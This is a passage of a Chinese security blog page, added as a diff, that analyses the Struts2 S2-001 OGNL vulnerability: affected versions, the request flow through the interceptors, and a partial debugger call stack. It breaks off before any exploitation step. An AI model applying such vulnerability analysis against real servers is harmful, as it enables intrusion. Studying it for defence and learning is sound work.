@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>JavaStruts2系列-S2-001 - N1Rvana&#39;s Blog</title><meta name="author" content="N1Rvana">
+<meta name="description" content="Web Security"><meta name="keywords" content='Struts2'>
+  <meta itemprop="name" content="JavaStruts2系列-S2-001">
+  <meta itemprop="description" content="Web Security">
+  <meta itemprop="datePublished" content="2024-11-15T13:47:01+08:00">
+  <meta itemprop="dateModified" content="2024-11-15T13:47:01+08:00">
+  <meta itemprop="wordCount" content="221">
+  <meta itemprop="image" content="http://localhost:1313/avatar.png">
+  <meta itemprop="keywords" content="Struts2"><meta property="og:url" content="http://localhost:1313/javastruts2%E7%B3%BB%E5%88%97-s2-001/">
+  <meta property="og:site_name" content="N1Rvana&#39;s Blog">
+  <meta property="og:title" content="JavaStruts2系列-S2-001">
+  <meta property="og:description" content="Web Security">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-11-15T13:47:01+08:00">
+    <meta property="article:modified_time" content="2024-11-15T13:47:01+08:00">
+    <meta property="article:tag" content="Struts2">
+    <meta property="og:image" content="http://localhost:1313/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/avatar.png">
+  <meta name="twitter:title" content="JavaStruts2系列-S2-001">
+  <meta name="twitter:description" content="Web Security">
+      <meta name="twitter:site" content="@huahua39079406">
+<meta name="twitter:creator" content="@huahua39079406" /><meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/javastruts2%E7%B3%BB%E5%88%97-s2-001/" title="JavaStruts2系列-S2-001 - N1Rvana&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%89/" title="Jackson反序列化（三）" /><link rel="next" type="text/html" href="http://localhost:1313/javastruts2-%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="JavaStruts2 学习与环境搭建" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/javastruts2%E7%B3%BB%E5%88%97-s2-001/index.md" title="JavaStruts2系列-S2-001 - N1Rvana's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "JavaStruts2系列-S2-001",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/javastruts2%E7%B3%BB%E5%88%97-s2-001\/"
+    },"genre": "posts","keywords": "Struts2","wordcount":  221 ,
+    "url": "http:\/\/localhost:1313\/javastruts2%E7%B3%BB%E5%88%97-s2-001\/","datePublished": "2024-11-15T13:47:01+08:00","dateModified": "2024-11-15T13:47:01+08:00","license": "Web Security","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><span class="nested-item">
+                  <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item" data-separator="/"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">JavaStruts2系列-S2-001</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>JavaStruts2系列-S2-001</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" alt="N1Rvana" data-title="N1Rvana" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/java/" class="post-category" title="Category - Java"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Java</a></span></div><div class="post-meta-line"><span title="published on 2024-11-15 13:47:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-11-15">2024-11-15</time></span>&nbsp;<span title="221 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="true">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-s2-001漏洞复现">0x01 S2-001漏洞复现</a>
+      <ul>
+        <li><a href="#漏洞影响范围">漏洞影响范围</a></li>
+        <li><a href="#流程分析">流程分析</a></li>
+        <li><a href="#漏洞利用">漏洞利用</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="0x01-s2-001漏洞复现" class="heading-element"><span>0x01 S2-001漏洞复现</span>
+  <a href="#0x01-s2-001%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="漏洞影响范围" class="heading-element"><span>漏洞影响范围</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%bd%b1%e5%93%8d%e8%8c%83%e5%9b%b4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>WebWork 2.1 (with altSyntax enabled) <br>
+WebWork 2.2.0 - WebWork 2.2.5 <br>
+Struts 2.0.0 - Struts 2.0.8<br>
+Struts2对 OGNL 表达式的解析使用了开源组件<code>opensymphony.xwork. 2.0.3</code>所以会有漏洞</p>
+<h3 id="流程分析" class="heading-element"><span>流程分析</span>
+  <a href="#%e6%b5%81%e7%a8%8b%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在<code>org.apache.struts2.dispatcher.FilterDispatcher</code>下，在这一个类的<code>doFilter()</code>方法中做了如下业务<br>
+设置编码和本地化信息<br>
+创建<code>ActionContext</code>对象<br>
+分配当前线程的分发器<br>
+将request对象进行封装<br>
+获取 ActionMapping 对象，ActionMapping 对象对应一个 action 详细配置信息<br>
+执行 Action 请求，也就是 172 行的<code>serviceAction()</code>方法<br>
+先在 Filter 的<code>doFilter()</code>方法下个断点，开始调试<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410151644176.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410151644176.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410151644176.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410151644176.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410151644176.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410151644176.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+首先获取当前请求是否已经有<code>ValueStack</code>对象，这样做的目的是在接收到 chain 跳转方式的请求时，可以直接接管上次请求的 action。如果没有 ValueStack 对象，获取当前线程的 ActionContext 对象；如果有 ValueStack 对象，将事先处理好的请求中的参数 put 到 ValueStack 中，获取 ActionMapping 中配置的 namespace，name，method 值<br>
+在<code>187</code>行这里，跟进<code>serviceAction()</code>方法<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152328470.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152328470.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152328470.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152328470.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152328470.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152328470.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+通过<code>ActionProxyFactory</code>的<code>createActionProxy()</code>类初始化一个<code>ActionProxy</code>，在这过程中也会创建<code>StrutsActionProxy</code>的实例。<code>StrutsActionProxy</code>是继承自<code>com.opensymphony.xwork2.DefaultActionProxy</code>的，在这个代理对象内部实际上就持有了<code>DefaultActionInvocation</code>的一个实例<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152333108.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152333108.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152333108.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152333108.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152333108.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152333108.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>DefaultActionInvocation</code>对象中保存了<code>Action</code>调用过程中需要的一切信息，继续往下走，跟进<code>proxy.execute()</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152339100.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152339100.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152339100.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152339100.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152339100.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152339100.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+获取到了上下文环境，并且调用<code>setter</code>方式赋值上下文，接着继续跟进<code>invoke()</code>方法<br>
+在<code>invoke()</code>方法中，首先会顺序的递归执行当前<code>Action</code>中所配置的所有的拦截器，知道拦截器遍历完毕调用真正的<code>Action</code>，此处是一个<code>interceptor</code>迭代器再进行遍历操作，对应遍历的内容是<code>struts2</code>包内的<code>struts-default.xml</code>里面<code>interceptors</code>标签中的内容<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152351941.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152351941.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152351941.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152351941.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152351941.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152351941.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+在众多迭代器中，<code>param</code>这一个迭代器使用来处理我们输入的参数的，所以会想到，会不会对应的迭代器里就有所谓的 OGNL 表达式的处理呢？跟进去查看一下<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152356561.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152356561.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152356561.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152356561.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152356561.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152356561.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+这段的大致意思就是，最开始在登陆框中的<code>username</code>和<code>password</code>会被保存到stack 里面，通过<code>ActionContext.getParameters()</code>方法将<code>stack</code>里面的值拿出来，再通过<code>ValueStack.setValue(String,Object)</code>方法把值<code>set</code>进去<br>
+接着在后文，它表明了这个类能够处理 OGNL 表达式，并且已经考虑了安全性问题<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152357124.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152357124.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152357124.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152357124.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152357124.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410152357124.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+而此处的迭代器调用栈如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">intercept</span><span class="p">:</span><span class="n">155</span><span class="p">,</span><span class="w"> </span><span class="n">ServletConfigInterceptor</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">struts2</span><span class="p">.</span><span class="na">interceptor</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">doProfiling</span><span class="p">:</span><span class="n">224</span><span class="p">,</span><span class="w"> </span><span class="n">DefaultActionInvocation$2</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">doProfiling</span><span class="p">:</span><span class="n">223</span><span class="p">,</span><span class="w"> </span><span class="n">DefaultActionInvocation$2</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">profile</span><span class="p">:</span><span class="n">455</span><span class="p">,</span><span class="w"> </span><span class="n">UtilTimerStack</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">profiling</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">invoke</span><span class="p">:</span><span class="n">221</span><span class="p">,</span><span class="w"> </span><span class="n">DefaultActionInvocation</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">intercept</span><span class="p">:</span><span class="n">123</span><span class="p">,</span><span class="w"> </span><span class="n">AliasInterceptor</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">.</span><span class="na">interceptor</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">doProfiling</span><span class="p">:</span><span class="n">224</span><span class="p">,</span><span class="w"> </span><span class="n">DefaultActionInvocation$2</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">doProfiling</span><span class="p">:</span><span class="n">223</span><span class="p">,</span><span class="w"> </span><span class="n">DefaultActionInvocation$2</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">profile</span><span class="p">:</span><span class="n">455</span><span class="p">,</span><span class="w"> </span><span class="n">UtilTimerStack</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">profiling</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">invoke</span><span class="p">:</span><span class="n">221</span><span class="p">,</span><span class="w"> </span><span class="n">DefaultActionInvocation</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">intercept</span><span class="p">:</span><span class="n">176</span><span class="p">,</span><span class="w"> </span><span class="n">ExceptionMappingInterceptor</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">.</span><span class="na">interceptor</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">doProfiling</span><span class="p">:</span><span class="n">224</span><span class="p">,</span><span class="w"> </span><span class="n">DefaultActionInvocation$2</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">doProfiling</span><span class="p">:</span><span class="n">223</span><span class="p">,</span><span class="w"> </span><span class="n">DefaultActionInvocation$2</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">profile</span><span class="p">:</span><span class="n">455</span><span class="p">,</span><span class="w"> </span><span class="n">UtilTimerStack</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">profiling</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">invoke</span><span class="p">:</span><span class="n">221</span><span class="p">,</span><span class="w"> </span><span class="n">DefaultActionInvocation</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">)</span><span class="w">  
